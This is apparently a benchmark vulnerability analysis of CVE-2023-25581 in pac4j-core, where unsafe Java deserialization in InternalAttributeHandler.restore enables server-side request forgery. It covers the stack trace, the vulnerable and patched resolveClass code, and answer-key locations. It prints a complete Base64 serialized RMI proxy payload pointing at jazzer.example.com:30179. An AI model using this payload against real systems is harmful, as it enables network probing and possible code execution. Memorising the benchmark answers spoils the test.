# Vulnerability Analysis for cpv_0

## Summary
- **CPV ID**: cpv_0
- **Harness**: Pac4jOne
- **Vulnerability Type**: Server Side Request Forgery (SSRF) via Java Deserialization (Jazzer detection); underlying issue is Unsafe Deserialization (CWE-502)
- **Origin**: 1-day
- **CVE**: CVE-2023-25581
- **Release Date**: 10/10/2024
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2023-25581
  - https://github.com/advisories/GHSA-76mw-6p95-x9x5
  - https://securitylab.github.com/advisories/GHSL-2022-085_pac4j/

## Crash Log Analysis
- **Error Type**: FuzzerSecurityIssueMedium: Server Side Request Forgery (SSRF)
- **Detection Method**: Jazzer sanitizer detected attempted connection to untrusted destination
- **Connection Attempt**: `jazzer.example.com:30179`
- **Root Cause**: Java deserialization of untrusted RMI objects
- **DEDUP Token**: ac32213d290d78e6

### Stack Trace
The vulnerability is triggered through this call chain:
```
com.aixcc.pac4j.harnesses.one.Pac4jOne.fuzzerTestOneInput(Pac4jOne.java:13)
  → org.pac4j.core.profile.InternalAttributeHandler.restore(InternalAttributeHandler.java:95)
    → org.pac4j.core.util.JavaSerializationHelper.deserializeFromBase64(JavaSerializationHelper.java:69)
      → org.pac4j.core.util.JavaSerializationHelper.deserializeFromBytes(JavaSerializationHelper.java:82)
        → java.io.ObjectInputStream.readObject()
          → java.rmi.server.RemoteObject.readObject()
            → java.rmi.transport.LiveRef.read()
              → sun.rmi.transport.tcp.TCPChannel.createConnection()
                → java.net.Socket.connect()
```

The Jazzer SSRF sanitizer intercepted the connection attempt at:
```java
at com.code_intelligence.jazzer.sanitizers.ServerSideRequestForgery.checkSsrfSocket(ServerSideRequestForgery.java:71)
at java.base/java.net.Socket.connect(Socket.java:633)
```

## Vulnerable Code Location(s)

### Location 1: crash_site (where SSRF attempt is detected)
- **Type**: crash_site
- **File Path**: pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java
- **Function**: restore
- **Line Range**: 95-95
- **Column Range**: 1-80

### Location 2: root_cause (insufficient deserialization protection)
- **Type**: root_cause
- **File Path**: pac4j-core/src/main/java/org/pac4j/core/util/JavaSerializationHelper.java
- **Function**: RestrictedObjectInputStream.resolveClass
- **Line Range**: 153-163
- **Column Range**: 1-80

### Code Context - crash_site

From `InternalAttributeHandler.java` line 94-95:
```java
} else if (sValue.startsWith(PREFIX_SB64)) {
    return serializationHelper.deserializeFromBase64(sValue.substring(PREFIX_SB64.length()));
}
```

When a string attribute starts with `{#sb64}`, the code automatically deserializes the Base64-encoded content without validating what classes are being deserialized.

### Code Context - root_cause

From `JavaSerializationHelper.java` lines 152-163 (vulnerable version):
```java
@Override
protected Class<?> resolveClass(final ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    final String qualifiedClassName = desc.getName();
    final Class<?> clazz = trustedClasses.get(qualifiedClassName);
    if (Objects.nonNull(clazz)) {
        return clazz;
    } else if (trustedPackages.stream().anyMatch(qualifiedClassName::startsWith)) {
        return super.resolveClass(desc);
    } else {
        throw new ClassNotFoundException("Wont resolve untrusted class: " + qualifiedClassName);
    }
}
```

**The vulnerability**: This code uses a blocklist approach where it allows classes from trusted packages but does NOT explicitly block dangerous Java built-in classes like `java.rmi.*`, `java.net.*`, and `sun.rmi.*`. These classes can be abused during deserialization to trigger network connections (SSRF) or potentially achieve remote code execution.

### Patch Analysis

The patch adds an explicit blocklist for network and RMI-related classes at the beginning of `resolveClass()`:

```java
@Override
protected Class<?> resolveClass(final ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    final String qualifiedClassName = desc.getName();
+   // Block network-related and RMI classes to prevent SSRF via deserialization
+   if (qualifiedClassName.startsWith("java.net.") ||
+       qualifiedClassName.startsWith("java.rmi.") ||
+       qualifiedClassName.startsWith("sun.rmi.")) {
+       throw new ClassNotFoundException("Wont resolve unsafe class: " + qualifiedClassName);
+   }
    final Class<?> clazz = trustedClasses.get(qualifiedClassName);
    // ... rest of code
}
```

This blocks dangerous Java classes before the trusted package check, preventing exploitation via RMI/network objects.

## CWE Classification
- **CWE-502**: Deserialization of Untrusted Data (primary)
- **CWE-918**: Server-Side Request Forgery (SSRF) (manifestation)
- **CWE-913**: Improper Control of Dynamically-Managed Code Resources

## Vulnerability Description

**Summary**: pac4j-core versions prior to 4.0.0 contain an unsafe deserialization vulnerability (CVE-2023-25581) that allows attackers to deserialize arbitrary Java objects, leading to Server-Side Request Forgery (SSRF) and potentially Remote Code Execution (RCE).

**Technical Details**:
1. The `InternalAttributeHandler.restore()` method processes user-controlled attributes
2. When an attribute value starts with the prefix `{#sb64}`, it's treated as a Base64-encoded serialized Java object
3. The code deserializes this object using `JavaSerializationHelper.deserializeFromBytes()`
4. While a `RestrictedObjectInputStream` is used, it only validates against a trusted packages allowlist
5. The restriction **fails to block** dangerous Java built-in packages like `java.rmi.*`, `java.net.*`, and `sun.rmi.*`
6. Attackers can craft serialized RMI objects (e.g., `java.rmi.registry.Registry`) that trigger network connections during deserialization
7. This enables SSRF attacks and can potentially chain with other gadgets for RCE

**Attack Vector**:
An attacker provides a malicious attribute like:
```
{#sb64}rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cg...
```

The Base64 content contains a serialized `java.rmi.registry.Registry` proxy object that references a remote RMI server (`jazzer.example.com:30179`). During deserialization, Java's RMI implementation automatically attempts to connect to this server, enabling SSRF.

**Impact**:
- **SSRF**: Attackers can force the server to connect to arbitrary hosts/ports
- **Information Disclosure**: Can probe internal network services
- **RCE Potential**: With appropriate gadget chains, this could lead to remote code execution

## POV Analysis

The POV file (`pov_0.blob`) contains:
```
{#sb64}rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3OwAKVW5pY2FzdFJlZgASamF6emVyLmV4YW1wbGUuY29tAAB14wAAAAAwHz/GAAAAAAAAAAAAAAAAAAAAeA==
```

This is a Base64-encoded serialized Java object. When decoded and deserialized, it reconstructs:
- A `java.rmi.registry.Registry` proxy object
- Using `java.lang.reflect.Proxy`
- With a `java.rmi.server.RemoteObjectInvocationHandler`
- Containing a `UnicastRef` pointing to `jazzer.example.com:30179`

When this object is deserialized, Java's RMI machinery automatically attempts to establish a TCP connection to the specified host, triggering the SSRF detection.

## Patch Analysis

The fix adds an explicit blocklist check at the start of `RestrictedObjectInputStream.resolveClass()`:

**Before** (vulnerable):
- Only checked if class was in trusted classes or trusted packages
- Did not block dangerous Java built-in classes

**After** (patched):
- Explicitly blocks `java.net.*`, `java.rmi.*`, and `sun.rmi.*` packages
- Prevents deserialization of network-related and RMI classes
- Blocks SSRF attack vector while maintaining legitimate functionality

This defense-in-depth approach combines:
1. Blocklist (deny dangerous classes)
2. Allowlist (permit only trusted packages/classes)

## Recommendations

**For vuln.yaml generation**:
- **CWEs**: [CWE-502, CWE-918]
- **Vulnerability Name**: "Unsafe Deserialization Leading to SSRF via RMI Objects"
- **Origin**: 1-day
- **Release Date**: 10/10/2024
- **References**: 
  - CVE-2023-25581
  - GHSA-76mw-6p95-x9x5
  - GHSL-2022-085

**Location Details**:
1. **crash_site**: 
   - File: `pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java`
   - Function: `restore`
   - Line: 95

2. **root_cause**:
   - File: `pac4j-core/src/main/java/org/pac4j/core/util/JavaSerializationHelper.java`
   - Function: `RestrictedObjectInputStream.resolveClass`
   - Lines: 153-163 (specifically the missing blocklist check before line 155)